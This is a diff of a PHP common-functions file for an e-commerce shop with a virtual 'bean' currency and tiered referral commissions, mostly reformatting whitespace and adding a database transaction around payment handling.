@@ -54,7 +54,7 @@ function get_user_info($user_value, $type = 0, $oauth = '')
         $thirdUser = Db::name('oauth_users')->where(['unionid' => $user_value])->find();
         $map['user_id'] = $thirdUser['user_id'];
     }
-
+    
     return Db::name('users')->where($map)->find();
 }
 
@@ -69,7 +69,7 @@ function getGoodsSpecImg($goods_id,$item_id){
     if (empty($specImg)) {
         return '';
     }
-
+    
     return $specImg;
 }
 
@@ -82,12 +82,12 @@ function getGoodsSpecImg($goods_id,$item_id){
  */
 function goods_thum_images($goods_id, $width, $height,$item_id=0)
 {
-
+    
     if (empty($goods_id)) return '';
     //判断缩略图是否存在
     $path = UPLOAD_PATH."goods/thumb/$goods_id/";
     $goods_thumb_name = "goods_thumb_{$goods_id}_{$item_id}_{$width}_{$height}";
-
+    
     // 这个商品 已经生成过这个比例的图片就直接返回了
     if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
     if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
@@ -96,13 +96,13 @@ function goods_thum_images($goods_id, $width, $height,$item_id=0)
     $original_img = '';//先定义空字符变量
     if($item_id){
         $original_img = Db::name('spec_goods_price')->where(["goods_id"=>$goods_id,'item_id'=>$item_id])->cache(true, 30, 'original_img_cache')->value('spec_img');
-
+        
     }
     if(empty($original_img)){
         $original_img = Db::name('goods')->where("goods_id", $goods_id)->cache(true, 30, 'original_img_cache')->value('original_img');
     }
-
-
+    
+    
     if (empty($original_img)) {
         return '/public/images/icon_goods_thumb_empty_300.png';
     }
@@ -111,14 +111,14 @@ function goods_thum_images($goods_id, $width, $height,$item_id=0)
         $ossClient = new \app\common\logic\OssLogic;
         if (($ossUrl = $ossClient->getGoodsThumbImageUrl($original_img, $width, $height))) {
             return $ossUrl;
-        }    
-    } 
-
+        }
+    }
+    
     $original_img = '.' . $original_img; // 相对路径
     if (!is_file($original_img)) {
         return '/public/images/icon_goods_thumb_empty_300.png';
     }
-
+    
     try {
         require_once 'vendor/topthink/think-image/src/Image.php';
         require_once 'vendor/topthink/think-image/src/image/Exception.php';
@@ -129,17 +129,17 @@ function goods_thum_images($goods_id, $width, $height,$item_id=0)
             require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
         }
         $image = \think\Image::open($original_img);
-
+        
         $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
         // 生成缩略图
         !is_dir($path) && mkdir($path, 0777, true);
         // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
         $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
         $img_url = '/' . $path . $goods_thumb_name;
-
+        
         return $img_url;
     } catch (think\Exception $e) {
-
+        
         return $original_img;
     }
 }
@@ -158,7 +158,7 @@ function get_sub_images($sub_img, $goods_id, $width, $height)
     if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
     if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
     if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';
-
+    
     if(tpCache('oss.oss_switch')){
         $ossClient = new \app\common\logic\OssLogic;
         if (($ossUrl = $ossClient->getGoodsAlbumThumbUrl($sub_img['image_url'], $width, $height))) {
@@ -170,7 +170,7 @@ function get_sub_images($sub_img, $goods_id, $width, $height)
     if (!is_file($original_img)) {
         return '/public/images/icon_goods_thumb_empty_300.png';
     }
-
+    
     try {
         require_once 'vendor/topthink/think-image/src/Image.php';
         require_once 'vendor/topthink/think-image/src/image/Exception.php';
@@ -181,17 +181,17 @@ function get_sub_images($sub_img, $goods_id, $width, $height)
             require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
         }
         $image = \think\Image::open($original_img);
-
+        
         $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
         // 生成缩略图
         !is_dir($path) && mkdir($path, 0777, true);
         // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
         $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
         $img_url = '/' . $path . $goods_thumb_name;
-
+        
         return $img_url;
     } catch (think\Exception $e) {
-
+        
         return $original_img;
     }
 }
@@ -203,7 +203,7 @@ function get_sub_images($sub_img, $goods_id, $width, $height)
 function refresh_stock($goods_id){
     $count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->count();
     if($count == 0) return false; // 没有使用规格方式 没必要更改总库存
-
+    
     $store_count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->sum('store_count');
     M("Goods")->where("goods_id", $goods_id)->save(array('store_count'=>$store_count)); // 更新商品的总库存
 }
@@ -281,7 +281,7 @@ function send_email($to,$subject='',$content=''){
     $mail->Host = $config['smtp_server'];
     //端口 - likely to be 25, 465 or 587
     $mail->Port = $config['smtp_port'];
-
+    
     if($mail->Port == 465) $mail->SMTPSecure = 'ssl';// 使用安全协议
     //Whether to use SMTP authentication
     $mail->SMTPAuth = true;
@@ -301,7 +301,7 @@ function send_email($to,$subject='',$content=''){
     }else{
         $mail->addAddress($to);
     }
-
+    
     $mail->isHTML(true);// send as HTML
     //标题
     $mail->Subject = $subject;
@@ -340,7 +340,7 @@ function checkEnableSendSms($scene)
     if(!$isCheckRegCode || $isCheckRegCode===0){
         return array("status" => 0, "msg" => "短信验证码功能关闭, 无需校验验证码");
     }
-
+    
     if (!$smsEnable) {
         return array("status" => -1, "msg" => "['$sceneName']发送短信被关闭'");
     }
@@ -350,7 +350,7 @@ function checkEnableSendSms($scene)
         return array("status" => -1, "msg" => "请先添加['$sceneName']短信模板");
     }
     
-
+    
     return array("status"=>1,"msg"=>"可以发送短信");
 }
 
@@ -462,10 +462,10 @@ function getArticleCatGrandson2($cat_id)
  */
 function cart_goods_num($user_id = 0,$session_id = '')
 {
-//    $where = " session_id = '$session_id' ";
-//    $user_id && $where .= " or user_id = $user_id ";
+    //    $where = " session_id = '$session_id' ";
+    //    $user_id && $where .= " or user_id = $user_id ";
     // 查找购物车数量
-//    $cart_count =  M('Cart')->where($where)->sum('goods_num');
+    //    $cart_count =  M('Cart')->where($where)->sum('goods_num');
     $cart_count = Db::name('cart')->where(function ($query) use ($user_id, $session_id) {
         $query->where('session_id', $session_id);
         if ($user_id) {
@@ -483,12 +483,12 @@ function cart_goods_num($user_id = 0,$session_id = '')
  */
 function getGoodNum($goods_id,$key)
 {
-     if (!empty($key)){
+    if (!empty($key)){
         return M("SpecGoodsPrice")
-                        ->alias("s")
-                        ->join('_Goods_ g ','s.goods_id = g.goods_id','LEFT')
-                        ->where(['g.goods_id' => $goods_id, 'key' => $key ,"is_on_sale"=>1])->getField('s.store_count');
-    }else{ 
+        ->alias("s")
+        ->join('_Goods_ g ','s.goods_id = g.goods_id','LEFT')
+        ->where(['g.goods_id' => $goods_id, 'key' => $key ,"is_on_sale"=>1])->getField('s.store_count');
+    }else{
         return M("Goods")->where(array("goods_id"=>$goods_id , "is_on_sale"=>1))->getField('store_count');
     }
 }
@@ -612,107 +612,107 @@ function accountLog($user_id, $user_money = 0,$pay_points = 0, $desc = '',$distr
 //     }
 // }
 
-    function adv_order($user_id, $order_adv_profit = 0, $desc = '',$order_id = 0 ,$type){
-        /* 插入帐户变动记录 */
-        $account_log = array(
-            'user_id'       => $user_id,
-            'user_money'    => $order_adv_profit,
-            'add_time'   => time(),
-            'desc'   => $desc,
-            'type'=>$type
-        );
-        /*更新每日订单任务信息 */
-        $update_data = array(
-            'order_point'   => ['exp','order_point+'.$order_adv_profit],
-        );
-        $update = Db::name('order')->where("order_id = $order_id")->save($update_data);
-        if($update){
-            M('adv_log')->add($account_log);
-            return true;
-        }else{
-            return false;
-        }
+function adv_order($user_id, $order_adv_profit = 0, $desc = '',$order_id = 0 ,$type){
+    /* 插入帐户变动记录 */
+    $account_log = array(
+        'user_id'       => $user_id,
+        'user_money'    => $order_adv_profit,
+        'add_time'   => time(),
+        'desc'   => $desc,
+        'type'=>$type
+    );
+    /*更新每日订单任务信息 */
+    $update_data = array(
+        'order_point'   => ['exp','order_point+'.$order_adv_profit],
+    );
+    $update = Db::name('order')->where("order_id = $order_id")->save($update_data);
+    if($update){
+        M('adv_log')->add($account_log);
+        return true;
+    }else{
+        return false;
     }
+}
 /*
  * 收益提到余额记录，并且消耗悦玩豆
  */
-    function withdrawal_balance_finance($user_id,$money,$desc = '',$order_id=0,$type=1){
-        $confBeans = M('config')->column('value','name');
-        $account_log = array(
-            'user_id'       => $user_id,
-            'money'    => $money,
-            'add_time'   => time(),
-            'order_id'=>$order_id,
-            'desc' =>$desc,
-            'type'=>$type
-        );
-        /** 消耗能量豆******/
-        $orderBeansProfit = ceil(($confBeans['profit_cons_beans']/100) * $money);
-        $update_data = array(
-            'happy_beans'   => ['exp','happy_beans-'.$orderBeansProfit],
-        );
-        $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
-        $adv_log = array(
-            'user_id'       => $user_id,
-            'user_money'    => '-'.$orderBeansProfit,
-            'add_time'   => time(),
-            'order_id'=>$order_id,
-            'desc' =>'领取任务收益消耗能量豆',
-            'type'=>1
-        );
-        M('adv_log')->add($adv_log);
-        /** 消耗能量豆******/
-        if($update){
-            M('withdrawal_balance')->add($account_log);
-            return true;
-        }else{
-            return false;
-        }
+function withdrawal_balance_finance($user_id,$money,$desc = '',$order_id=0,$type=1){
+    $confBeans = M('config')->column('value','name');
+    $account_log = array(
+        'user_id'       => $user_id,
+        'money'    => $money,
+        'add_time'   => time(),
+        'order_id'=>$order_id,
+        'desc' =>$desc,
+        'type'=>$type
+    );
+    /** 消耗能量豆******/
+    $orderBeansProfit = ceil(($confBeans['profit_cons_beans']/100) * $money);
+    $update_data = array(
+        'happy_beans'   => ['exp','happy_beans-'.$orderBeansProfit],
+    );
+    $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
+    $adv_log = array(
+        'user_id'       => $user_id,
+        'user_money'    => '-'.$orderBeansProfit,
+        'add_time'   => time(),
+        'order_id'=>$order_id,
+        'desc' =>'领取任务收益消耗能量豆',
+        'type'=>1
+    );
+    M('adv_log')->add($adv_log);
+    /** 消耗能量豆******/
+    if($update){
+        M('withdrawal_balance')->add($account_log);
+        return true;
+    }else{
+        return false;
     }
-    //获取悦玩豆
-    function consumption_beans($user_id,$beans,$desc){
-        $account_log = array(
-            'user_id'       => $user_id,
-            'user_money'    => $beans,
-            'add_time'   => time(),
-            'desc' =>$desc,
-            'type'=>1
-        );
-        $update_data = array(
-            'happy_beans'   => ['exp','happy_beans+'.$beans]
-        );
-        $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
-        if($update){
-            M('adv_log')->add($account_log);
-            return true;
-        }else{
-            return false;
-        }
+}
+//获取悦玩豆
+function consumption_beans($user_id,$beans,$desc){
+    $account_log = array(
+        'user_id'       => $user_id,
+        'user_money'    => $beans,
+        'add_time'   => time(),
+        'desc' =>$desc,
+        'type'=>1
+    );
+    $update_data = array(
+        'happy_beans'   => ['exp','happy_beans+'.$beans]
+    );
+    $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
+    if($update){
+        M('adv_log')->add($account_log);
+        return true;
+    }else{
+        return false;
     }
-    
-    
+}
 
-    //消耗悦玩豆
-    function lose_beans($user_id,$beans,$desc){
-        $account_log = array(
-            'user_id'       => $user_id,
-            'user_money'    => '-'.$beans,
-            'add_time'   => time(),
-            'desc' =>$desc,
-            'type'=>1
-        );
-        $update_data = array(
-            'happy_beans'   => ['exp','happy_beans-'.$beans]
-        );
-        $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
-        if($update){
-            M('adv_log')->add($account_log);
-            return true;
-        }else{
-            return false;
-        }
+
+
+//消耗悦玩豆
+function lose_beans($user_id,$beans,$desc){
+    $account_log = array(
+        'user_id'       => $user_id,
+        'user_money'    => '-'.$beans,
+        'add_time'   => time(),
+        'desc' =>$desc,
+        'type'=>1
+    );
+    $update_data = array(
+        'happy_beans'   => ['exp','happy_beans-'.$beans]
+    );
+    $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
+    if($update){
+        M('adv_log')->add($account_log);
+        return true;
+    }else{
+        return false;
     }
-    
+}
+
 
 
 
@@ -756,33 +756,33 @@ function orderStatusDesc($order_id = 0, $order = array())
 {
     if(empty($order))
         $order = M('Order')->where("order_id", $order_id)->find();
-
-    // 货到付款
-    if($order['pay_code'] == 'cod')
-    {
-        if(in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0)
-            return 'WAITSEND'; //'待发货',
-    }
-    else // 非货到付款
-    {
-        if($order['pay_status'] == 0 && $order['order_status'] == 0)
-            return 'WAITPAY'; //'待支付',
-        if($order['pay_status'] == 1 &&  in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0)
-            return 'WAITSEND'; //'待发货',
-        if($order['pay_status'] == 1 &&  $order['shipping_status'] == 2 && $order['order_status'] == 1)
-            return 'PORTIONSEND'; //'部分发货',
-    }
-    if(($order['shipping_status'] == 1) && ($order['order_status'] == 1))
-        return 'WAITRECEIVE'; //'待收货',
-    if($order['order_status'] == 2)
-        return 'WAITCCOMMENT'; //'待评价',
-    if($order['order_status'] == 3)
-        return 'CANCEL'; //'已取消',
-    if($order['order_status'] == 4)
-        return 'FINISH'; //'已完成',
-    if($order['order_status'] == 5)
-        return 'CANCELLED'; //'已作废',
-    return 'OTHER';
+        
+        // 货到付款
+        if($order['pay_code'] == 'cod')
+        {
+            if(in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0)
+                return 'WAITSEND'; //'待发货',
+        }
+        else // 非货到付款
+        {
+            if($order['pay_status'] == 0 && $order['order_status'] == 0)
+                return 'WAITPAY'; //'待支付',
+                if($order['pay_status'] == 1 &&  in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0)
+                    return 'WAITSEND'; //'待发货',
+                    if($order['pay_status'] == 1 &&  $order['shipping_status'] == 2 && $order['order_status'] == 1)
+                        return 'PORTIONSEND'; //'部分发货',
+        }
+        if(($order['shipping_status'] == 1) && ($order['order_status'] == 1))
+            return 'WAITRECEIVE'; //'待收货',
+            if($order['order_status'] == 2)
+                return 'WAITCCOMMENT'; //'待评价',
+                if($order['order_status'] == 3)
+                    return 'CANCEL'; //'已取消',
+                    if($order['order_status'] == 4)
+                        return 'FINISH'; //'已完成',
+                        if($order['order_status'] == 5)
+                            return 'CANCELLED'; //'已作废',
+                            return 'OTHER';
 }
 
 /**
@@ -795,81 +795,81 @@ function orderBtn($order_id = 0, $order = array())
 {
     if(empty($order))
         $order = M('Order')->where("order_id", $order_id)->find();
-    /**
-     *  订单用户端显示按钮
-    去支付     AND pay_status=0 AND order_status=0 AND pay_code ! ="cod"
-    取消按钮  AND pay_status=0 AND shipping_status=0 AND order_status=0
-    确认收货  AND shipping_status=1 AND order_status=0
-    评价      AND order_status=1
-    查看物流  if(!empty(物流单号))
-     */
-    $btn_arr = array(
-        'pay_btn' => 0, // 去支付按钮
-        'cancel_btn' => 0, // 取消按钮
-        'receive_btn' => 0, // 确认收货
-        'comment_btn' => 0, // 评价按钮
-        'shipping_btn' => 0, // 查看物流
-        'return_btn' => 0, // 退货按钮 (联系客服)
-    );
-
-
-    // 货到付款
-    if($order['pay_code'] == 'cod')
-    {
-
-        if(($order['order_status']==0 || $order['order_status']==1) && $order['shipping_status'] == 0) // 待发货
-        {
-            $btn_arr['cancel_btn'] = 1; // 取消按钮 (联系客服)
-        }
-        if($order['shipping_status'] == 1 && $order['order_status'] == 1) //待收货
-        {
-            $btn_arr['receive_btn'] = 1;  // 确认收货
-        }
-    } else{// 非货到付款
-        if($order['pay_status'] == 0 && $order['order_status'] == 0) // 待支付
-        {
-            $btn_arr['pay_btn'] = 1; // 去支付按钮
-            $btn_arr['cancel_btn'] = 1; // 取消按钮
-        }
-        if($order['pay_status'] == 1 && in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0) // 待发货
-        {
-//            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
-            if ($order['prom_type'] == 6 || $order['prom_type'] == 4) {
-                $btn_arr['cancel_btn'] = 0;
-            } else {
-                $btn_arr['cancel_btn'] = 1; // 取消按钮
-            }
-        }
-        if($order['pay_status'] == 1 && $order['order_status'] == 1  && $order['shipping_status'] == 1) //待收货
-        {
-            $btn_arr['receive_btn'] = 1;  // 确认收货
-//            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
-        }
-    }
-    if($order['order_status'] == 2)
-    {
-        $btn_arr['comment_btn'] = 1;  // 评价按钮
-        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
-    }
-    if($order['shipping_status'] != 0 && in_array($order['order_status'], [1,2,4]))
-    {
-        $btn_arr['shipping_btn'] = 1; // 查看物流
-    }
-    if($order['shipping_status'] == 2  && $order['order_status'] == 1) // 部分发货
-    {
-//        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
-    }
-    
-    if($order['pay_status'] == 1  && shipping_status && $order['order_status'] == 4) // 已完成(已支付, 已发货 , 已完成)
-    {
-            $btn_arr['return_btn'] = 1; // 退货按钮
-    }
-    
-    if($order['order_status'] == 3 && ($order['pay_status'] == 1 || $order['pay_status'] == 4)){
-    	$btn_arr['cancel_info'] = 1; // 取消订单详情
-    }
-
-    return $btn_arr;
+        /**
+         *  订单用户端显示按钮
+         去支付     AND pay_status=0 AND order_status=0 AND pay_code ! ="cod"
+         取消按钮  AND pay_status=0 AND shipping_status=0 AND order_status=0
+         确认收货  AND shipping_status=1 AND order_status=0
+         评价      AND order_status=1
+         查看物流  if(!empty(物流单号))
+         */
+         $btn_arr = array(
+             'pay_btn' => 0, // 去支付按钮
+             'cancel_btn' => 0, // 取消按钮
+             'receive_btn' => 0, // 确认收货
+             'comment_btn' => 0, // 评价按钮
+             'shipping_btn' => 0, // 查看物流
+             'return_btn' => 0, // 退货按钮 (联系客服)
+         );
+         
+         
+         // 货到付款
+         if($order['pay_code'] == 'cod')
+         {
+             
+             if(($order['order_status']==0 || $order['order_status']==1) && $order['shipping_status'] == 0) // 待发货
+             {
+                 $btn_arr['cancel_btn'] = 1; // 取消按钮 (联系客服)
+             }
+             if($order['shipping_status'] == 1 && $order['order_status'] == 1) //待收货
+             {
+                 $btn_arr['receive_btn'] = 1;  // 确认收货
+             }
+         } else{// 非货到付款
+             if($order['pay_status'] == 0 && $order['order_status'] == 0) // 待支付
+             {
+                 $btn_arr['pay_btn'] = 1; // 去支付按钮
+                 $btn_arr['cancel_btn'] = 1; // 取消按钮
+             }
+             if($order['pay_status'] == 1 && in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0) // 待发货
+             {
+                 //            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
+                 if ($order['prom_type'] == 6 || $order['prom_type'] == 4) {
+                     $btn_arr['cancel_btn'] = 0;
+                 } else {
+                     $btn_arr['cancel_btn'] = 1; // 取消按钮
+                 }
+             }
+             if($order['pay_status'] == 1 && $order['order_status'] == 1  && $order['shipping_status'] == 1) //待收货
+             {
+                 $btn_arr['receive_btn'] = 1;  // 确认收货
+                 //            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
+             }
+         }
+         if($order['order_status'] == 2)
+         {
+             $btn_arr['comment_btn'] = 1;  // 评价按钮
+             $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
+         }
+         if($order['shipping_status'] != 0 && in_array($order['order_status'], [1,2,4]))
+         {
+             $btn_arr['shipping_btn'] = 1; // 查看物流
+         }
+         if($order['shipping_status'] == 2  && $order['order_status'] == 1) // 部分发货
+         {
+             //        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
+         }
+         
+         if($order['pay_status'] == 1  && shipping_status && $order['order_status'] == 4) // 已完成(已支付, 已发货 , 已完成)
+         {
+             $btn_arr['return_btn'] = 1; // 退货按钮
+         }
+         
+         if($order['order_status'] == 3 && ($order['pay_status'] == 1 || $order['pay_status'] == 4)){
+             $btn_arr['cancel_info'] = 1; // 取消订单详情
+         }
+         
+         return $btn_arr;
 }
 
 /**
@@ -928,7 +928,7 @@ function update_pay_status($order_sn,$ext=array())
         $order = M('recharge')->where(['order_sn' => $order_sn, 'pay_status' => 0])->find();
         if (!$order) return false;// 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
         M('recharge')->where("order_sn",$order_sn)->save(array('pay_status'=>1,'pay_time'=>$time));
-
+        
         $msg = '会员在线充值';
         if( $order['buy_vip'] == 1){
             rechargevip_rebate($order);
@@ -958,10 +958,10 @@ function update_pay_status($order_sn,$ext=array())
             // 修改支付状态  已支付
             $update = array('pay_status'=>1,'pay_time'=>$time);
             if($order['type'] == 1 && $order['join_t'] == 1){
-               /*  $update['seven_days'] = strtotime('+7 day');
-                $update['fourteen_days'] = strtotime('+14 day');
-                $update['fifteen_days'] = strtotime('+15 day');
-                $update['twenty_eight_days'] = strtotime('+28 day'); */
+                /*  $update['seven_days'] = strtotime('+7 day');
+                 $update['fourteen_days'] = strtotime('+14 day');
+                 $update['fifteen_days'] = strtotime('+15 day');
+                 $update['twenty_eight_days'] = strtotime('+28 day'); */
                 $time = time();
                 $update['seven_days'] = $time+(3*60);
                 $update['fourteen_days'] =  $time+(6*60);
@@ -986,90 +986,115 @@ function update_pay_status($order_sn,$ext=array())
         // 给他升级, 根据order表查看消费记录 给他会员等级升级 修改他的折扣 和 总金额
         $User =new \app\common\logic\User();
         $User->setUserById($order['user_id']);
-        /* 根据不同的type分别处理订单 */
-         if($order['type'] == 1){//商品下单
-            if($order['join_t'] == 1){//参与t+7和动态收益
-                $User->updateUserEffective();//给t+7的标志；
-                $user = $parent = M('users')->field('pid_list')->where('user_id='.$order['user_id'])->find();
-                if($user['pid_list']){
-                    $pidArr = array_reverse(explode(',',$user['pid_list']));
-                    unset($pidArr[0]);
-                    $conf = M('config')->where('id >=172 and id <=177')->column('value','name');
-                    foreach($pidArr as $k=>$v){
-                        if($v){
-                            $pidCount = M('users')->where("first_leader ='$v'")->count();//查询每级用户的直属下级有几个
-                            $orderCount = M('order')->where('user_id='.$v.' and pay_status = 1')->count();//根据订单查询是否是有效用户
-                            $userBurn = M('users')->where("user_id = $v")->value('burn');  //$userBurn为1要进行烧伤   2针对部分用户不进行烧伤
-                            if($k == 1 || $k == 2){
-//                                 if($orderCount && ($pidCount >= 1 && $pidCount <=5)){
-                                if($orderCount && ($pidCount >= 1 && $pidCount <=2)){
-                                    $order_amount = $order['order_amount'];
-                                    if($userBurn == 1){
-                                           //查询上级最后一个订单的金额，进行烧伤
-                                        $order_amount = getUserBurn($v,$order['order_amount']);
-                                     }
-                                     $rela = ($conf['level_'.$k]/100) * $order_amount;
+        Db::startTrans();
+        try{
+            /* 根据不同的type分别处理订单 */
+            if($order['type'] == 1){//商品下单
+                if($order['join_t'] == 1){//参与t+7和动态收益
+                    $User->updateUserEffective();//给t+7的标志；
+                    $user = $parent = M('users')->field('pid_list')->where('user_id='.$order['user_id'])->find();
+                    if($user['pid_list']){
+                        $pidArr = array_reverse(explode(',',$user['pid_list']));
+                        unset($pidArr[0]);
+                        $conf = M('config')->where('id >=172 and id <=177')->column('value','name');
+                        foreach($pidArr as $k=>$v){
+                            if($v){
+                                $pidCount = M('users')->where("first_leader ='$v'")->count();//查询每级用户的直属下级有几个
+                                $orderCount = M('order')->where('user_id='.$v.' and pay_status = 1')->count();//根据订单查询是否是有效用户
+                                $userBurn = M('users')->where("user_id = $v")->value('burn');  //$userBurn为1要进行烧伤   2针对部分用户不进行烧伤
+                                $rela = 0;
+                                if($k == 1 || $k == 2){
+                                    //                                 if($orderCount && ($pidCount >= 1 && $pidCount <=5)){
+                                    if($orderCount && ($pidCount >= 1 && $pidCount <=2)){
+                                        $order_amount = $order['order_amount'];
+                                        if($userBurn == 1){
+                                            //查询上级最后一个订单的金额，进行烧伤
+                                            $order_amount = getUserBurn($v,$order['order_amount']);
+                                        }
+                                        if($order['order_consum_ywd'] == 0){
+                                            $order_amount = $order_amount - $order['ywd_price'];
+                                        }
+                                        $rela = ($conf['level_'.$k]/100) * $order_amount;
+                                    }
                                 }
-                            }
-                            if($k == 3 || $k == 4){
-//                                 if(($pidCount > 6 && $pidCount < 19) && $orderCount){
+                                if($k == 3 || $k == 4){
+                                    
+                                    //                                 if(($pidCount > 6 && $pidCount < 19) && $orderCount){
                                     if(($pidCount >= 3 && $pidCount <= 4) && $orderCount){
-                                    $order_amount = $order['order_amount'];
-                                    if($userBurn == 1){
-                                        //查询上级最后一个订单的金额，进行烧伤
-                                        $order_amount = getUserBurn($v);
+                                        $order_amount = $order['order_amount'];
+                                        if($userBurn == 1){
+                                            //查询上级最后一个订单的金额，进行烧伤
+                                            $order_amount = getUserBurn($v);
+                                        }
+                                        if($order['order_consum_ywd'] == 0){
+                                            $order_amount = $order_amount - $order['ywd_price'];
+                                        }
+                                        $rela = ($conf['level_'.$k]/100) * $order_amount;
                                     }
-                                    $rela = ($conf['level_'.$k]/100) * $order_amount;
                                 }
-                            }
-                            if($k == 5 || $k == 6){
-                                if($pidCount >= 20 && $orderCount){
-                                    $order_amount = $order['order_amount'];
-                                    if($userBurn == 1){
-                                        //查询上级最后一个订单的金额，进行烧伤
-                                        $order_amount = getUserBurn($v);
+                                if($k == 5 || $k == 6){
+                                    if($pidCount >= 20 && $orderCount){
+                                        $order_amount = $order['order_amount'];
+                                        if($userBurn == 1){
+                                            //查询上级最后一个订单的金额，进行烧伤
+                                            $order_amount = getUserBurn($v);
+                                        }
+                                        if($order['order_consum_ywd'] == 0){
+                                            $order_amount = $order_amount - $order['ywd_price'];
+                                        }
+                                        $rela = ($conf['level_'.$k]/100) * $order_amount;
                                     }
-                                    $rela = ($conf['level_'.$k]/100) * $order_amount;
                                 }
-                            }
-                            if($rela){
-                                dynamic_profit($v,$rela,'团队用户购买商品获得收益',$order['order_id'],3);
+                                if($rela){
+                                    dynamic_profit($v,$rela,'团队用户购买商品获得收益',$order['order_id'],3);
+                                }
                             }
                         }
                     }
                 }
-            }
-            /*
-             * 根据悦玩豆ywd_price 消耗悦玩豆
-             */
-            if($order['order_consum_ywd']){//需要扣悦玩豆
-                lose_beans($order['user_id'],$order['ywd_price'],'购买商品消耗悦玩豆');
-            }
-        }elseif($order['type'] == 2){//购买悦玩豆
-            consumption_beans($order['user_id'],$order['ywd_price'],'在线购买悦玩豆');
-        }elseif($order['type'] == 3){
-           // M('task')->where('order_id='.$order['order_id'])->update(['status'=>1]);//改变task的状态
-           if($order['ywd_price']){
-                lose_beans($order['user_id'],$order['ywd_price'],'购买广告');
-           }
-        }elseif($order['type'] == 4){//快速购买悦玩豆通道
-               $sellArr =  M('buy')->alias('a')->field('a.unit_price,a.purchaser buy_id,a.order_id,a.number,a.unit_price,b.user_id sell_id')->join('sell b','a.sell_id=b.sell_id')
+                /*
+                 * 根据悦玩豆ywd_price 消耗悦玩豆
+                 */
+                if($order['order_consum_ywd']){//需要扣悦玩豆
+                    lose_beans($order['user_id'],$order['ywd_price'],'购买商品消耗悦玩豆');
+                }
+            }elseif($order['type'] == 2){//购买悦玩豆
+                consumption_beans($order['user_id'],$order['ywd_price'],'在线购买悦玩豆');
+            }elseif($order['type'] == 3){
+                // M('task')->where('order_id='.$order['order_id'])->update(['status'=>1]);//改变task的状态
+                if($order['ywd_price']){
+                    lose_beans($order['user_id'],$order['ywd_price'],'购买广告');
+                }
+            }elseif($order['type'] == 4){//快速购买悦玩豆通道
+                $sellArr =  M('buy')->alias('a')->field('a.unit_price,a.purchaser buy_id,a.order_id,a.number,a.unit_price,b.user_id sell_id')->join('sell b','a.sell_id=b.sell_id')
                 ->where('a.order_id='.$order['order_id'])
                 ->find();
-                 if(!empty($sellArr)){
-                     $total_price = $sellArr['unit_price'] * $sellArr['number'];
+                if(!empty($sellArr)){
+                    $total_price = $sellArr['unit_price'] * $sellArr['number'];
                     /***给卖家+余额-冻结余额***/
-                     accountLog($sellArr['sell_id'],$total_price,0,'挂卖悦玩豆获得余额'); //卖家加余额
-                        M('users')->where('user_id='.$sellArr['sell_id'])->setDec('frozen_beans',$sellArr['number']);
-                     /***给买家 +悦玩豆和记录***/
-                     consumption_beans($sellArr['buy_id'],$sellArr['number'],'购买获得悦玩豆');
-                  } 
-            
+                    accountLog($sellArr['sell_id'],$total_price,0,'挂卖悦玩豆获得余额'); //卖家加余额
+                    M('users')->where('user_id='.$sellArr['sell_id'])->setDec('frozen_beans',$sellArr['number']);
+                    /***给买家 +悦玩豆和记录***/
+                    consumption_beans($sellArr['buy_id'],$sellArr['number'],'购买获得悦玩豆');
+                }
+                
+            }
+                Db::commit();
+        }catch (Exception $exception){
+                 Db::rollback();
+           /*  return json([
+                'code'  =>  -1,
+                //                    'msg'   =>  $exception->getMessage(),
+                'msg'   =>  '网络异常，请重新购买',
+                'data'  =>  [],
+            ]); */
         }
-       /*  else{//支付投放广告
-            lose_beans($order['user_id'],$order['ywd_price'],'购买广告消耗悦玩豆');//修改悦豌豆余额，
-        } */
-
+        
+        
+        /*  else{//支付投放广告
+         lose_beans($order['user_id'],$order['ywd_price'],'购买广告消耗悦玩豆');//修改悦豌豆余额，
+         } */
+        
         $User->updateUserLevel();
         // 记录订单操作日志
         $commonOrder = new \app\common\logic\Order();
@@ -1085,39 +1110,39 @@ function update_pay_status($order_sn,$ext=array())
         $distribut_condition = tpCache('distribut.condition');
         if($distribut_condition == 1)  // 购买商品付款才可以成为分销商
             M('users')->where("user_id", $order['user_id'])->save(array('is_distribut'=>1));
-        //虚拟服务类商品支付
